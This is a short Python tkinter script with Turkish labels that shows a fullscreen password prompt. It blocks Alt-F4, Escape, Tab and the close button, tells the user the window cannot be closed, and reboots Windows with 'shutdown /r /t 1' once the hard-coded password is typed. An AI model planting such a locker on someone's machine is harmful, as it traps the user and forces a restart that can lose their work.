import tkinter as tk
from tkinter import messagebox
import os

def disable_event():
    pass

def check_password():
    if entry.get() == "12340":
        messagebox.showinfo("Başarılı", "Şifre doğru! Bilgisayar yeniden başlatılıyor.")
        os.system('shutdown /r /t 1')
    else:
        messagebox.showerror("Hata", "Yanlış şifre! Pencereyi kapatamazsınız.")

def toggle_password():
    if entry.cget('show') == '':
        entry.config(show='*')
        toggle_button.config(text="Şifreyi Göster")
    else:
        entry.config(show='')
        toggle_button.config(text="Şifreyi Gizle")

root = tk.Tk()
root.title("Şifre Penceresi")

# Tam ekran yap
root.attributes("-fullscreen", True)

# Alt+F4 ve diğer kapanma yollarını devre dışı bırak
root.protocol("WM_DELETE_WINDOW", disable_event)
root.bind("<Alt-F4>", lambda e: "break")
root.bind("<Tab>", lambda e: "break")
root.bind("<Control-Escape>", lambda e: "break")
root.bind("<Escape>", lambda e: "break")
root.bind_all("<KeyPress>", lambda e: "break" if e.state == 8 else None)

label = tk.Label(root, text="Şifre:", font=("Helvetica", 24))
label.pack(pady=10)

entry = tk.Entry(root, show="*", font=("Helvetica", 24))
entry.pack(pady=10)

toggle_button = tk.Button(root, text="Şifreyi Göster", command=toggle_password, font=("Helvetica", 18))
toggle_button.pack(pady=10)

button = tk.Button(root, text="Giriş", command=check_password, font=("Helvetica", 18))
button.pack(pady=10)

root.mainloop()
